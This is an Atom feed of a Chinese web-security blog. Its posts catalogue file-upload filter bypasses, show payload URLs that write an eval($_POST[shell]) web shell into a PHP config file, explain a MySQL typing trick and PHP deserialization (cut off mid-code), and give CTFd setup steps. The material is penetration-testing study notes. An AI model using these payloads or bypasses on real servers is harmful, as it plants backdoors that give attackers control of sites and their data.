<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>教堂</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://evilchurch.github.io/"/>
  <updated>2017-11-01T15:37:29.000Z</updated>
  <id>https://evilchurch.github.io/</id>
  
  <author>
    <name>教堂</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>文件上传绕过姿势</title>
    <link href="https://evilchurch.github.io/CHURCH/file-upload.html"/>
    <id>https://evilchurch.github.io/CHURCH/file-upload.html</id>
    <published>2017-03-04T12:11:50.000Z</published>
    <updated>2017-11-01T15:37:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传漏洞应该是渗透测试中用的比较多的漏洞了，毕竟可以很方便的getshell，可是网站也会有很多限制，这里就总结一下文件上传的绕过姿势。</p><a id="more"></a><h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>客户端使用JavaScript校验上传文件的后缀名，在文件未上传到服务器时，就对文件进行验证，任何客户端的验证都是不安全的。</p><p>绕过也是比较简单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. 可以用firebug将form表单中的js校验事件删除</div><div class="line">2. 使用burp：</div><div class="line">   1）先将木马文件的扩展名改为一张正常图片的扩展名，如gif</div><div class="line">   2）上传时使用burp截包，将文件扩展名改为asp/php/jsp即可</div></pre></td></tr></table></figure><h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><h5 id="MIME验证"><a href="#MIME验证" class="headerlink" title="MIME验证"></a>MIME验证</h5><p>通常服务器端会做类似如下验证</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>]==<span class="string">"image/jpeg"</span>)&#123;</div><div class="line">    $imageTempName = $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>];</div><div class="line">    $imageName = $_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</div><div class="line">    $last = substr($imageName,strrpos($imageName,<span class="string">"."</span>));</div><div class="line">    <span class="keyword">if</span>(!is_dir(<span class="string">"uploadFile"</span>))&#123;</div><div class="line">        mkdir(<span class="string">"uploadFile"</span>);</div><div class="line">    &#125;</div><div class="line">    $imageName = md5($imageName).$last;</div><div class="line">    move_upload_file($imageTempName,<span class="string">"./uploadFile/"</span>.$imageName);</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"文件上传成功"</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span>(<span class="string">"文件上传类型错误"</span>);</div><div class="line">    <span class="keyword">exit</span>();</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>此时，只需抓包修改conten-type为image/jpeg即可</p><h5 id="文件内容验证"><a href="#文件内容验证" class="headerlink" title="文件内容验证"></a>文件内容验证</h5><h6 id="文件幻数检测"><a href="#文件幻数检测" class="headerlink" title="文件幻数检测"></a>文件幻数检测</h6><p>在文件头部加上一些幻数，后面写木马即可，比如<code>jpg–&gt;JFIF</code> <code>gif–&gt;GIF89a</code> <code>PNG–&gt;PNG</code></p><h6 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="文件相关信息检测"></a>文件相关信息检测</h6><p>通常使用getimagesize()函数，只需在幻数基础上加一些杂乱信息，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">GIF89a</div><div class="line">(binary data)</div><div class="line">木马</div><div class="line">(binary data)</div></pre></td></tr></table></figure><h5 id="文件扩展名"><a href="#文件扩展名" class="headerlink" title="文件扩展名"></a>文件扩展名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1. 黑名单漏掉的规则：.asa .cer</div><div class="line">2. 大小写：pHp AsP</div><div class="line">3. 混搭：.php1 .php2</div></pre></td></tr></table></figure><h5 id="截断绕过"><a href="#截断绕过" class="headerlink" title="截断绕过"></a>截断绕过</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">0x00截断：构造如test.php(0x00).jpg的文件</div></pre></td></tr></table></figure><p><img src="/img/upload1.png" alt=""></p><p><img src="/img/upload2.png" alt=""></p><h5 id="服务器解析漏洞绕过"><a href="#服务器解析漏洞绕过" class="headerlink" title="服务器解析漏洞绕过"></a>服务器解析漏洞绕过</h5><h6 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h6><p>低版本(&lt;7.0)时</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">1. 当文件夹格式为*.asp、*.asa时，其目录下任意文件都会被解析为asp</div><div class="line">2. 当文件为*.asp;1.jpg时，会被解析为asp(默认不解析;号后面的内容)</div></pre></td></tr></table></figure><p>IIS(7.0/7.5)</p><p><code>同Nginx的CGI解析漏洞</code></p><h6 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h6><p>Apache 解析文件的规则是从右到左开始判断解析,如果扩展名不认识时,就再往左判断。比如 test.php.php1，“php1” 这种扩展名是Apache不可识别解析，Apache就会把test.php.php1解析成php。</p><p>故可以构造木马文件名类似为：xxx.php.aaa</p><h6 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">对低版本的Nginx(0.8.03)可以在任意文件名后添加%00.php进行解析攻击</div></pre></td></tr></table></figure><p>如：上传名为xx.jpg%00.php就会解析为php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问www.xxx.com/x.txt/x.php</div><div class="line">时，若x.php不存在，则PHP会递归向前解析，将x.txt当作php脚本来解析</div></pre></td></tr></table></figure><p>如：可以在x.txt里直接写入木马</p><h5 id="其它绕过"><a href="#其它绕过" class="headerlink" title="其它绕过"></a>其它绕过</h5><h6 id="操作系统文件命令规则"><a href="#操作系统文件命令规则" class="headerlink" title="操作系统文件命令规则"></a>操作系统文件命令规则</h6><ol><li><p>Windows</p><p>上传不符合windows文件命名规则的文件名，如<code>test.asp.</code> <code>test.asp(空格)</code> <code>test.php:1.jpg</code> <code>test.php::$DATA</code> <code>shell.php::$DATA…….</code> ，会被系统自动去掉不符合规则符号后面的内容。</p></li></ol><ol><li><p>Linux</p><p>后缀名大小写，可以试试上传pHp后缀的文件。</p></li></ol><h6 id="htaccess文件攻击"><a href="#htaccess文件攻击" class="headerlink" title=".htaccess文件攻击"></a>.htaccess文件攻击</h6><p>通过<code>.htaccess</code>文件调用php解析器去解析.jpg(或者其他)文件，<code>.haccess</code>文件代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;FilesMatch \.jpg$&gt;</div><div class="line">    SetHandler application/x-httpd-php</div><div class="line">&lt;/FilesMatch&gt;</div></pre></td></tr></table></figure><p>然后上传扩展为.jpg的任意文件马都会被解析为php</p><p><img src="/img/upload3.png" alt=""></p><p><img src="/img/upload4.png" alt=""></p><p><em>注：<code>.htaccess</code>是apache服务器中的一个配置文件,不是上传的文件的黑名单之内 ,所以<code>.htaccess</code>文件是可以上传成功。</em></p><h6 id="user-ini文件攻击"><a href="#user-ini文件攻击" class="headerlink" title=".user.ini文件攻击"></a>.user.ini文件攻击</h6><p>只要中间键是以fastcgi运行的php都可以用这个方法，.user.ini能被动态加载，它也有两个配置项：auto_append_file和auto_prepend_file，直接在.user.ini中添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auto_prepend_file=x.jpg</div></pre></td></tr></table></figure><p>就可以让正常的php文件执行前自动包含x.jpg(图片马)，类似于require()</p><p><img src="/img/upload5.png" alt=""></p><p><img src="/img/upload6.png" alt=""></p><p><em>注：前提是含有.user.ini的文件夹下需要有正常的php文件</em></p><p><br></p><p><strong>参考</strong></p><p><a href="http://drops.wooyun.org/tips/3424" target="_blank" rel="external">.user.ini文件构成的PHP后门</a></p><p><a href="http://thief.one/2016/09/22/%E4%B8%8A%E4%BC%A0%E6%9C%A8%E9%A9%AC%E5%A7%BF%E5%8A%BF%E6%B1%87%E6%80%BB-%E6%AC%A2%E8%BF%8E%E8%A1%A5%E5%85%85/" target="_blank" rel="external">文件上传漏洞（绕过姿势）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文件上传漏洞应该是渗透测试中用的比较多的漏洞了，毕竟可以很方便的getshell，可是网站也会有很多限制，这里就总结一下文件上传的绕过姿势。&lt;/p&gt;
    
    </summary>
    
      <category term="Web安全" scheme="https://evilchurch.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="https://evilchurch.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="文件上传" scheme="https://evilchurch.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>一个有趣的trick</title>
    <link href="https://evilchurch.github.io/CHURCH/an-interesting-bug.html"/>
    <id>https://evilchurch.github.io/CHURCH/an-interesting-bug.html</id>
    <published>2017-03-01T09:11:16.000Z</published>
    <updated>2017-03-12T15:01:40.000Z</updated>
    
    <content type="html"><![CDATA[<p>在小密圈里看到的一个姿势，个人认为是弱类型导致的问题</p><p><img src="/img/interbug1.png" alt=""></p><p><img src="/img/interbug2.png" alt=""></p><p>因为’’*’’==0，而name为字符型，在类型转换的时候导致出现这个问题，有点像PHP里的类型转换。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在小密圈里看到的一个姿势，个人认为是弱类型导致的问题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/interbug1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/interbug2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;因为’’*’’==0，而n
      
    
    </summary>
    
      <category term="MySQL" scheme="https://evilchurch.github.io/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://evilchurch.github.io/tags/MySQL/"/>
    
      <category term="弱类型" scheme="https://evilchurch.github.io/tags/%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>p师傅的经典漏洞(小密圈的那些姿势)</title>
    <link href="https://evilchurch.github.io/CHURCH/a-classical-bug.html"/>
    <id>https://evilchurch.github.io/CHURCH/a-classical-bug.html</id>
    <published>2017-02-27T14:51:08.000Z</published>
    <updated>2017-11-01T15:36:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>p师傅在小密圈po的一个问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$str = addslashes($_GET[<span class="string">'option'</span>]);</div><div class="line">$file = file_get_contents(<span class="string">'xxxxx/option.php'</span>);</div><div class="line">$file = preg_replace(<span class="string">'|\$option=\'.*\';|'</span>, <span class="string">"\$option='$str';"</span>, $file);</div><div class="line">file_put_contents(<span class="string">'xxxxx/option.php'</span>, $file);</div></pre></td></tr></table></figure><p>做代码审计较少，但试了一下，绕过还是很容易的。但是只想到一种姿势(第一种)，下面把各位师傅的几种姿势全都贴出来记录一下: )</p><a id="more"></a><h2 id="姿势一"><a href="#姿势一" class="headerlink" title="姿势一"></a>姿势一</h2><p><em>payload:</em></p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost/11.php?option=1';%0aeval($_POST[shell]);//</div><div class="line">http://localhost/11.php?option=1</div></pre></td></tr></table></figure><p>其实是利用<code>addslashes()</code>来对单引号<code>&#39;</code>处理成为<code>\&#39;</code>，最后经过正则替换就成了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$option=<span class="string">'1\';</span></div><div class="line"><span class="string">eval($_POST[shell]);//'</span>;</div></pre></td></tr></table></figure><p>当然还需要再访问一次</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/11.php?option=1</div></pre></td></tr></table></figure><p>将<code>\</code>替换掉，最终写入文件的为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$option=<span class="string">'1'</span>;</div><div class="line"><span class="keyword">eval</span>($_POST[shell]);<span class="comment">//';</span></div></pre></td></tr></table></figure><p><img src="/img/classical1.png" alt=""></p><h2 id="姿势二"><a href="#姿势二" class="headerlink" title="姿势二"></a>姿势二</h2><p><em>payload:</em></p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/11.php?option=1\';%0aeval($_POST[shell]);//</div></pre></td></tr></table></figure><p>传入payload后，分别输出<code>$str</code>和经过<code>preg_replace()</code>替换后的<code>$file</code></p><p><img src="/img/classical2.png" alt=""></p><p>可以看到经过<code>addslashes()</code>处理后的<code>1\\\&#39;</code>三个<code>\</code>变成了两个<code>\</code>，猜测应该是<code>preg_replace()</code>做了转义的处理，导致这个变化，所以最后写入文件的也就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$option=<span class="string">'1\\'</span>;</div><div class="line"><span class="keyword">eval</span>($_POST[shell]);<span class="comment">//';</span></div></pre></td></tr></table></figure><h2 id="姿势三"><a href="#姿势三" class="headerlink" title="姿势三"></a>姿势三</h2><p><em>payload:</em></p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://localhost/11.php?option=;eval($_POST[shell]);//</div><div class="line">http://localhost/11.php?option=%00(或者$0)</div></pre></td></tr></table></figure><p>传一个参数后<code>$option=&#39;;eval($_POST[shell]);//&#39;;</code>，但传入<code>%00</code>或<code>$0</code>时，这里看一下关于<code>preg_replace()</code>的文档</p><p><img src="/img/classical3.png" alt=""></p><p><code>preg_replace()</code>第二个参数为<code>$0</code>和<code>\0</code>时都是完全匹配模式，所以最后写入的内容为<code>$option=&#39;$option=&#39;;eval($_POST[shell]);//&#39;;&#39;;</code></p><p><br></p><p><strong>感谢</strong></p><p><a href="http://www.cnblogs.com/iamstudy/articles/config_file_write_vue.html" target="_blank" rel="external">小密圈专题(1)-配置文件写入问题</a></p><p>以及圈子里各位师傅</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;p师傅在小密圈po的一个问题&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$str = addslashes($_GET[&lt;span class=&quot;string&quot;&gt;&#39;option&#39;&lt;/span&gt;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$file = file_get_contents(&lt;span class=&quot;string&quot;&gt;&#39;xxxxx/option.php&#39;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$file = preg_replace(&lt;span class=&quot;string&quot;&gt;&#39;|\$option=\&#39;.*\&#39;;|&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;\$option=&#39;$str&#39;;&quot;&lt;/span&gt;, $file);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;file_put_contents(&lt;span class=&quot;string&quot;&gt;&#39;xxxxx/option.php&#39;&lt;/span&gt;, $file);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;做代码审计较少，但试了一下，绕过还是很容易的。但是只想到一种姿势(第一种)，下面把各位师傅的几种姿势全都贴出来记录一下: )&lt;/p&gt;
    
    </summary>
    
      <category term="PHP" scheme="https://evilchurch.github.io/categories/PHP/"/>
    
    
      <category term="PHP" scheme="https://evilchurch.github.io/tags/PHP/"/>
    
      <category term="Web安全" scheme="https://evilchurch.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="代码审计" scheme="https://evilchurch.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>CTFd折腾记录</title>
    <link href="https://evilchurch.github.io/CHURCH/ctfd.html"/>
    <id>https://evilchurch.github.io/CHURCH/ctfd.html</id>
    <published>2017-02-01T02:01:20.000Z</published>
    <updated>2017-11-01T15:37:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>去年看到不少高校都有自己的ctf练习平台，就想着给学校社团也搭一个，期间也尝试过<a href="https://github.com/facebook/fbctf" target="_blank" rel="external">fbctf</a>，界面确实够炫酷，可就是太臃肿，就想着试试<a href="https://github.com/isislab/CTFd" target="_blank" rel="external">CTFd</a>，测试一段时间，觉着还算稳定，就把折腾的思路记录一下，免得大家多走弯路。</p><a id="more"></a><h2 id="Flask安装"><a href="#Flask安装" class="headerlink" title="Flask安装"></a>Flask安装</h2><p><code>需求的环境是要能使用apt的(ubuntu或者debian之类)</code></p><p><em>以下全部在ubuntu16.04下测试</em></p><ol><li><p>安装git</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt install git</div></pre></td></tr></table></figure></li><li><p>安装pip</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt install python-pip</div></pre></td></tr></table></figure></li><li><p>安装Flask</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo pip install Flask</div></pre></td></tr></table></figure></li><li><p>下载&amp;安装&amp;运行CTFd</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sudo git clone https://github.com/isislab/CTFd.git</div><div class="line">cd CTFd</div><div class="line">sudo ./prepare.sh</div><div class="line">sudo python serve.py</div></pre></td></tr></table></figure></li></ol><p>但是，看各位师傅说这样直接运行性能很差，所以也可以用gunicorn</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo pip install gunicorn</div><div class="line">sudo gunicorn --bind 0.0.0.0:4000 -w 1 "CTFd:create_app()"</div></pre></td></tr></table></figure><p>至此平台就搭建完成了，在浏览器访问你的服务器公网ip:4000就可以进入了.</p><p><img src="/img/ctfd.png" alt=""></p><h2 id="Nginx-uwsgi"><a href="#Nginx-uwsgi" class="headerlink" title="Nginx + uwsgi"></a>Nginx + uwsgi</h2><p>看画船师傅说flask和gunicorn在低配服务器上性能不好(官方也说只能用来测试)，就折腾了一下Nginx + uwsgi</p><ol><li><p>安装nginx&amp;uwsgi</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt install nginx</div><div class="line">sudo pip install uwsgi</div></pre></td></tr></table></figure></li><li><p>配置nginx</p><p>在/etc/nginx/sites-available/目录，创建一个站点文件(删除default文件)</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">  listen 80;</div><div class="line">  server_name www.site.com;</div><div class="line"></div><div class="line">  location / &#123;</div><div class="line">    include uwsgi_params;</div><div class="line">    uwsgi_pass unix:/tmp/uwsgi.sock;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>cp文件到/etc/nginx/sites-enable/下(删除default文件)</p></li><li><p>运行</p><p>切换到CTFd目录下</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">service nginx start</div><div class="line">sudo uwsgi -s /tmp/uwsgi.sock -w "CTFd:create_app()"</div></pre></td></tr></table></figure><p>访问站点，若502错误</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chmod 777 /tmp/uwsgi.sock</div></pre></td></tr></table></figure></li><li><p>启动/停止一键脚本(画船师傅的)</p><p><em>start.sh</em></p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo nohup uwsgi -s /tmp/uwsgi.sock -w "CTFd:create_app()"&amp;</div><div class="line">service nginx start</div><div class="line">sudo chmod 777 /tmp/uwsgi.sock</div></pre></td></tr></table></figure><p><em>stop.sh</em></p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ps -ef | grep uwsgi | grep -v grep | awk '&#123;print $2&#125;' | xargs kill -9</div><div class="line">service nginx stop</div></pre></td></tr></table></figure></li></ol><p><br></p><p><strong>参考：</strong></p><p><a href="http://www.ifuryst.com/archives/CTFd.html" target="_blank" rel="external">CTFd搭建CTF平台</a></p><p><a href="http://blog.nuptzj.cn/?p=21" target="_blank" rel="external">CTFd折腾笔记</a></p><p><a href="https://blog.kings-way.info/?p=596" target="_blank" rel="external">Python Web（mainly Flask）环境折腾小记</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;去年看到不少高校都有自己的ctf练习平台，就想着给学校社团也搭一个，期间也尝试过&lt;a href=&quot;https://github.com/facebook/fbctf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;fbctf&lt;/a&gt;，界面确实够炫酷，可就是太臃肿，就想着试试&lt;a href=&quot;https://github.com/isislab/CTFd&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;CTFd&lt;/a&gt;，测试一段时间，觉着还算稳定，就把折腾的思路记录一下，免得大家多走弯路。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://evilchurch.github.io/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://evilchurch.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>聊一聊PHP反序列化漏洞</title>
    <link href="https://evilchurch.github.io/CHURCH/php-unserialize.html"/>
    <id>https://evilchurch.github.io/CHURCH/php-unserialize.html</id>
    <published>2016-11-04T11:20:34.000Z</published>
    <updated>2017-11-01T15:37:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>反序列化漏洞在各种语言中都较为常见，下面就简单聊一聊PHP的反序列化漏洞(PHP对象注入)。第一次了解这个洞还是在某次ctf上，就简单记录下个人理解以及对CVE-2016-7124的简单分析。</p><a id="more"></a><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>php允许保存一个对象方便以后重用，这个过程被称为序列化，序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。先看一眼具体什么样子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span> </span>&#123;</div><div class="line">    <span class="keyword">public</span> $name = <span class="string">'church'</span>;</div><div class="line">    <span class="keyword">public</span> $phone = <span class="string">'111111'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">printdata</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name . <span class="string">'\'s phone is '</span> . <span class="keyword">$this</span>-&gt;phone;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$usr = <span class="keyword">new</span> info();</div><div class="line"></div><div class="line">$usr-&gt;printdata();</div><div class="line"><span class="keyword">echo</span> serialize($usr);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>此时输出</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">church's phone is 111111</div><div class="line">O:4:"info":2:&#123;s:4:"name";s:6:"church";s:5:"phone";s:6:"111111";&#125;</div></pre></td></tr></table></figure><p>可以看到其中没有任何跟类有关的东西，只有其中的数据被数据化。</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">O:4:"info":2:&#123;s:4:"name";s:6:"church";s:5:"phone";s:6:"111111";&#125;</div><div class="line">O:4:"info":2: 参数类型为对象(object)，数组(array)为a。类名为info，有两个变量(参数</div><div class="line">s:4:"name";s:6:"church"; s:变量类型为字符串(数字为i)，长度为4，名为name，值是长度为6的字符串church</div><div class="line">s:5:"phone";s:6:"111111"; 长度为5的字符串phone，值是长度为6的字符串111111</div></pre></td></tr></table></figure><p>反序列化是将序列化后的字符串转换回一个数组对象。由于对象实例化和自动加载，反序列化可能会导致代码被加载并被执行。再看一下反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">  </div><div class="line">...</div><div class="line">  </div><div class="line">$usr = unserialize(<span class="string">'O:4:"info":2:&#123;s:4:"name";s:6:"church";s:5:"phone";s:6:"111111";&#125;'</span>);</div><div class="line">$usr-&gt;printdata();</div></pre></td></tr></table></figure><p>这时输出</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">church's phone is 111111</div></pre></td></tr></table></figure><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>现在我们了解了序列化是如何工作的，那我们该如何利用它？因为反序列化对象的值是可控的，如果反序列化对象中存在魔术方法，而且魔术方法中的代码又能够被我们控制，漏洞就产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p><p>影响：<code>Joomla反序列化漏洞</code>、<code>SugarCRM v6.5.23 PHP对象注入漏洞</code>、<code>WordPress 3.6.1反序列化漏洞</code>等。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><p>php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号”__“开头的，比如 __construct, __destruct, __toString, __sleep, __wakeup等。</p><p>而这些函数在某些情况下是自动调用的，比如:</p><p>__construct当一个对象创建时调用，相反__destruct当一个对象被销毁时调用</p><p>__sleep方法在一个对象被序列化时调用，__wakeup方法在一个对象被反序列化时调用</p><p>__toString当一个对象被当作一个字符串使用时调用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span 